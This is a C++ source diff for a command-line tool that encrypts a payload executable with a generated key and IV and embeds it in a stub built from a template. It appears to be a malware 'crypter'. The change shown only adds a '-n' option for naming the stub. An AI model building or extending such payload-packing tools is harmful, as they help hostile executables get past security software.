@@ -22,6 +22,7 @@ void displayHelp(const int COLOR){
     cout << "\nUsage: ./main.exe [options]\nOptions:\n";
     cout << "\t-h, --help                 show all options, and exit\n";
     cout << "\t-p                         display paths for payload, stub output directory, stub template, and exit\n";
+    cout << "\t-n <\"name\">              name for stub\n";
     cout << "\t-c, --compile              compile generated stub immediately. makefile must be configured properly\n";
     cout << "\t--payload <C:\\\\path>       specify payload. first exe in ./bin will be used otherwise\n";
     cout << "\t--stub <C:\\\\stub>          specify stub template. by default /resource/stub.cpp is used\n";
@@ -34,7 +35,7 @@ void displayHelp(const int COLOR){
     resetColor();
 }
 
-void parseArgs(int argc, char* argv[], string *path_to_payload, string *path_to_output_dir, string *path_to_stub_template){
+void parseArgs(int argc, char* argv[], string *path_to_payload, string *path_to_output_dir, string *path_to_stub_template, string *stub_name){
     string tmpPl = *path_to_payload;
 
     resetColor();
@@ -73,13 +74,11 @@ void parseArgs(int argc, char* argv[], string *path_to_payload, string *path_to_
             if(i + 1 >= argc){
                 setColor(COLOR_ERROR);
                 cerr << "No path to stub specified\n\tUsage: ./main --stub \"C:\\\\path\\\\to\\\\stub\"\n";
-                //displayHelp(COLOR_ERROR);
                 exit(1);
             }
             if(!filesystem::exists(argv[i+1])){
                 setColor(COLOR_ERROR);
                 cerr << "Invalid stub path: " << argv[i+1] << "\n";
-                //displayHelp(COLOR_ERROR);
                 exit(1);
             } else if (!filesystem::is_regular_file(argv[i+1])){
                 setColor(COLOR_ERROR);
@@ -112,6 +111,10 @@ void parseArgs(int argc, char* argv[], string *path_to_payload, string *path_to_
             continue;
         } else if(strcmp(argv[i], "--pdb") == 0){
             flags[PDB] = true;
+            continue;
+        } else if(strcmp(argv[i], "-n") == 0){
+            flags[NAME] = true;
+            *stub_name = argv[i+1];
             continue;
         }
     }
@@ -189,6 +192,7 @@ int main(int argc, char * argv[]){
     string path_to_payload = (base_path / "bin").string();
     string path_to_output_dir = (base_path / "stub").string() + "\\";
     string path_to_stub_template = (base_path / "resource\\stub.cpp").string();
+    string stub_name;
 
     // Make sure the defaults exist before parsing arguments
     setColor(COLOR_ERROR);
@@ -208,7 +212,7 @@ int main(int argc, char * argv[]){
     }
     resetColor();
 
-    parseArgs(argc, argv, &path_to_payload, &path_to_output_dir, &path_to_stub_template);
+    parseArgs(argc, argv, &path_to_payload, &path_to_output_dir, &path_to_stub_template, &stub_name);
     displayOptions(&path_to_payload, &path_to_output_dir, &path_to_stub_template);
 
     // reading bytes of payload
@@ -223,7 +227,7 @@ int main(int argc, char * argv[]){
     // key and IV gen
     auto [key, iv] = generateKeyAndIV(LEN, LEN);
     vector<unsigned char> payloadBytes = encrypt(buf, key, iv);
-    writeStub(flags, path_to_stub_template, path_to_output_dir, payloadBytes, key, iv);
+    writeStub(flags, stub_name, path_to_stub_template, path_to_output_dir, payloadBytes, key, iv);
 
     return 0;
 }
